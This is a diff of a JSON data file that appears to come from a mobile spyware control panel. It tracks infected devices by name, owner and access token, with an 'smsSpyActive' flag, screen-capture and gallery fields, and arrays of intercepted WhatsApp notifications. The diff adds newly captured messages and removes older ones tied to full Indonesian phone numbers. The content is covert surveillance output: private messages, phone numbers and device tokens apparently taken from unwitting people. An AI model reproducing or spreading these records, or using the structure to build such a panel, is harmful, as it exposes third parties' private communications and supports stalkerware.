@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777352129748,
+    "lastSeen": 1777352141850,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -466,7 +466,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777352130670,
+    "lastSeen": 1777352142683,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -482,6 +482,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Downloading 1 videos",
+        "content": "from Jb Market all game dikz x own",
+        "time": "28/04 11:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777352143864
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Downloading 1 videos",
+        "content": "from Jb Market all game dikz x own",
+        "time": "28/04 11:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777352143820
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Downloading 1 documents",
+        "time": "28/04 11:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777352143690
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 852-3694-0729",
@@ -4457,30 +4481,6 @@
         "time": "27/04 19:49",
         "pkg": "com.whatsapp",
         "receivedAt": 1777294190928
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 831-7933-3065",
-        "content": "Maksudnya apa",
-        "time": "27/04 19:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777294189069
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 831-7933-3065",
-        "content": "Maksudnya apa",
-        "time": "27/04 19:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777294177577
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 831-7933-3065",
-        "content": "Maksudnya apa",
-        "time": "27/04 19:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777294177480
       }
     ],
     "galleryPhotos": [],
